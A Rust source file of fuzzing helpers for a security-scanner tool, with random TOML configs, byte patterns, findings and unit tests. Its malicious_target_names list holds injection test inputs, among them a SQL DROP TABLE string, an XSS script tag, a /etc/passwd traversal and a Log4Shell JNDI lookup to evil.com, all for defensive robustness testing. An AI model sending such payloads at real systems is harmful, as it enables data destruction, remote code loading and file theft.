use rand::Rng;
use rand::RngCore;

pub fn fuzz_toml_config() -> String {
    let mut rng = rand::thread_rng();
    let patterns = ["pipeline", "swarm", "tool-use", "hierarchical"];
    let levels = ["info", "debug", "trace", "warn", "error"];
    let providers = ["openai", "deepseek", "ollama", "groq"];
    let models = ["gpt-4o", "deepseek-v3", "llama3.2", "claude-sonnet-4"];

    let p = patterns[rng.gen_range(0..patterns.len())];
    let l = levels[rng.gen_range(0..levels.len())];
    let prov = providers[rng.gen_range(0..providers.len())];
    let mdl = models[rng.gen_range(0..models.len())];

    format!(
        r#"
[general]
workspace_dir = "~/.vest"
log_level = "{}"

[agent]
default_pattern = "{}"
max_concurrent_agents = {}
max_llm_iterations = {}
token_budget_per_scan = {}

[providers.default]
provider = "{}"
model = "{}"

[scanner]
[scanner.memory]
enabled = {}

[safety]
write_approval = {}
rate_limit_requests_per_second = {}
"#,
        l,
        p,
        rng.gen_range(1..32),
        rng.gen_range(10..500),
        rng.gen_range(10000..10000000),
        prov,
        mdl,
        rng.gen::<bool>(),
        rng.gen::<bool>(),
        rng.gen_range(1..1000),
    )
}

pub fn fuzz_string(length: usize) -> String {
    (0..length)
        .map(|_| rand::thread_rng().gen::<char>())
        .collect()
}

pub fn fuzz_bytes(length: usize) -> Vec<u8> {
    let mut data = vec![0u8; length];
    rand::thread_rng().fill_bytes(&mut data);
    data
}

pub fn fuzz_pattern(length: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| {
            if rng.gen_bool(0.2) {
                "??".to_string()
            } else {
                format!("{:02X}", rng.gen::<u8>())
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

pub fn fuzz_finding() -> (String, f64, String) {
    let mut rng = rand::thread_rng();
    let title_len = rng.gen_range(0..10000);
    let title = (0..title_len)
        .map(|_| rng.gen::<char>())
        .collect::<String>();
    let confidence = rng.gen_range(-1000.0..1000.0);
    let desc_len = rng.gen_range(0..50000);
    let desc = (0..desc_len).map(|_| rng.gen::<char>()).collect::<String>();
    (title, confidence, desc)
}

pub fn malicious_target_names() -> Vec<String> {
    vec![
        "'; DROP TABLE targets; --".into(),
        "<script>alert('pwned')</script>".into(),
        "../../../etc/passwd".into(),
        "\x00\x00\x00\x00".into(),
        "\\\\?\\C:\\Windows\\System32".into(),
        "${jndi:ldap://evil.com/a}".into(),
        "__proto__".into(),
        "constructor".into(),
        "NaN".into(),
        "Infinity".into(),
        "-0".into(),
        "null".into(),
        "undefined".into(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fuzz_toml_parses_without_panic() {
        for _ in 0..20 {
            let config = fuzz_toml_config();
            let _ = toml::from_str::<toml::Value>(&config);
        }
    }

    #[test]
    fn test_fuzz_bytes_generates_correct_length() {
        for len in &[0, 1, 10, 1000, 100000] {
            let data = fuzz_bytes(*len);
            assert_eq!(data.len(), *len);
        }
    }

    #[test]
    fn test_fuzz_pattern_valid_format() {
        for _ in 0..50 {
            let pattern = fuzz_pattern(10);
            let bytes: Vec<_> = pattern.split_whitespace().collect();
            for byte in &bytes {
                assert!(byte.len() == 2 || byte == &"??");
            }
        }
    }
}
